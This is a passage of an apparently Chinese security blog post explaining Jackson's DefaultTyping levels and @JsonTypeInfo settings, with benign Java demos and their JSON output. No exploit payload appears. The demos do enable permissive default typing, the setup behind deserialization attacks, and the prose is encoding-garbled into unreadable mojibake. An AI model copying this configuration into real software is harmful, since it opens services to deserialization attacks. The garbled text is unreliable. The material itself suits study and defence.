class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.mi1k7ea.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span>  </span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=mi1k7ea<span class="punctuation">,</span> com.mi1k7ea.Hacker@<span class="number">7</span>f9a81e8  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// æœªè®¾ç½®JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span>  </span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=mi1k7ea<span class="punctuation">,</span> <span class="punctuation">&#123;</span>skill=Jackson<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETEï¼šé™¤äº†å‰é¢æåˆ°çš„ç‰¹å¾ï¼Œå½“ç±»é‡Œæœ‰ Interfaceã€AbstractClass ç±»æ—¶ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼ˆå½“ç„¶è¿™äº›ç±»æœ¬èº«éœ€è¦æ—¶åˆæ³•çš„ã€å¯è¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼‰ã€‚</p><ul><li>æ­¤å¤–ï¼Œ<strong>enableDefaultTyping()é»˜è®¤çš„æ— å‚æ•°çš„è®¾ç½®å°±æ˜¯æ­¤é€‰é¡¹ã€‚</strong></li></ul><p>æ·»åŠ ä¸€ä¸ª Sex æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ·»åŠ  MySex ç±»å®ç° Sex æ¥å£ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ Person ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€ç¼–å†™åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OBJECT_AND_NON_CONCRETE_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// è®¾ç½®OBJECT_AND_NON_CONCRETE  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);  </span><br><span class="line">        <span class="comment">// æˆ–ç›´æ¥æ— å‚è°ƒç”¨ï¼Œè¾“å‡ºä¸€æ ·  </span></span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼Œå¯ä»¥çœ‹åˆ°è¯¥Interfaceç±»å±æ€§è¢«æˆåŠŸåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.object_and_non_concrete.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">6</span>d00a15d<span class="punctuation">,</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex@<span class="number">51</span>efea79</span><br></pre></td></tr></table></figure><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><p>NON_CONCRETE_AND_ARRAYSï¼šé™¤äº†å‰é¢æåˆ°çš„ç‰¹å¾å¤–ï¼Œè¿˜æ”¯æŒ Array ç±»å‹ã€‚</p><p>ç¼–å†™åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ä»£ç ï¼Œåœ¨ Object å±æ€§ä¸­å­˜åœ¨çš„æ˜¯æ•°ç»„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.non_concrete_and_arrays;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_CONCRETE_AND_ARRAYS_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        Hacker[] hackers = <span class="keyword">new</span> <span class="title class_">Hacker</span>[<span class="number">2</span>];  </span><br><span class="line">        hackers[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        hackers[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.object = hackers;  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// è®¾ç½®NON_CONCRETE_AND_ARRAYS  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçœ‹åˆ°ï¼Œç±»åå˜æˆäº† <code>â€[Lâ€+ç±»å+â€;â€</code>ï¼Œåºåˆ—åŒ– Object ä¹‹åä¸ºæ•°ç»„å½¢å¼ï¼Œååºåˆ—åŒ–ä¹‹åå¾—åˆ°<code>[Lcom.mi1k7ea.Hacker;</code> ç±»å¯¹è±¡ï¼Œè¯´æ˜å¯¹ Array ç±»å‹æˆåŠŸè¿›è¡Œäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š</p><h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><p>NON_FINALï¼šé™¤äº†å‰é¢çš„æ‰€æœ‰ç‰¹å¾å¤–ï¼ŒåŒ…å«å³å°†è¢«åºåˆ—åŒ–çš„ç±»é‡Œçš„å…¨éƒ¨ã€é final çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ•´ä¸ªç±»ã€é™¤ final å¤–çš„å±æ€§ä¿¡æ¯éƒ½éœ€è¦è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><p>ä¿®æ”¹ Person ç±»ï¼Œæ·»åŠ  Hacker å±æ€§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">    <span class="keyword">public</span> Hacker hacker;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s, %s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex, hacker == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : hacker);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–å†™åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.non_final;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_FINAL_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        p.hacker = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// è®¾ç½®NON_FINAL  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçœ‹åˆ°ï¼ŒæˆåŠŸå¯¹é final çš„ hacker å±æ€§è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.Person&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.object_and_non_concrete.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;hacker&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">6</span>d00a15d<span class="punctuation">,</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex@<span class="number">51</span>efea79<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">5034</span>c75a</span><br></pre></td></tr></table></figure><h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>ä»å‰é¢çš„åˆ†æçŸ¥é“ï¼ŒDefaultTyping çš„å‡ ä¸ªè®¾ç½®é€‰é¡¹æ˜¯é€æ¸æ‰©å¤§é€‚ç”¨èŒƒå›´çš„ï¼Œå¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>DefaultTypingç±»å‹</th><th>æè¿°è¯´æ˜</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>å±æ€§çš„ç±»å‹ä¸ºObject</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClassã€Array</td></tr><tr><td>NON_FINAL</td><td>æ‰€æœ‰é™¤äº†å£°æ˜ä¸ºfinalä¹‹å¤–çš„å±æ€§</td></tr></tbody></table><h3 id="JsonTypeInfo-æ³¨è§£"><a href="#JsonTypeInfo-æ³¨è§£" class="headerlink" title="@JsonTypeInfo æ³¨è§£"></a>@JsonTypeInfo æ³¨è§£</h3><p><code>@JsonTypeInfo</code> æ³¨è§£æ˜¯ Jackson å¤šæ€ç±»å‹ç»‘å®šçš„ä¸€ç§æ–¹å¼ï¼Œæ”¯æŒä¸‹é¢5ç§ç±»å‹çš„å–å€¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬é€ä¸ªçœ‹ä¸‹ã€‚</p><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p><strong>JsonTypeInfo_Id_NONE_Test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonTypeInfo_Id_NONE_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person2</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person2.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person2 ç±»ï¼Œç»™ object å±æ€§æ·»åŠ  <code>@JsonTypeInfo</code> æ³¨è§£ï¼ŒæŒ‡å®šä¸º <code>JsonTypeInfo.Id.NONE</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span>  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçœ‹åˆ°ï¼Œå’Œæ²¡æœ‰è®¾ç½®å€¼ä¸º <code>JsonTypeInfo.Id.NONE</code> çš„ <code>@JsonTypeInfo</code> æ³¨è§£æ˜¯ä¸€æ ·çš„ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> <span class="punctuation">&#123;</span>skill=hiphop<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/ld_none_result.png" class><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>ä¿®æ”¹ Person2 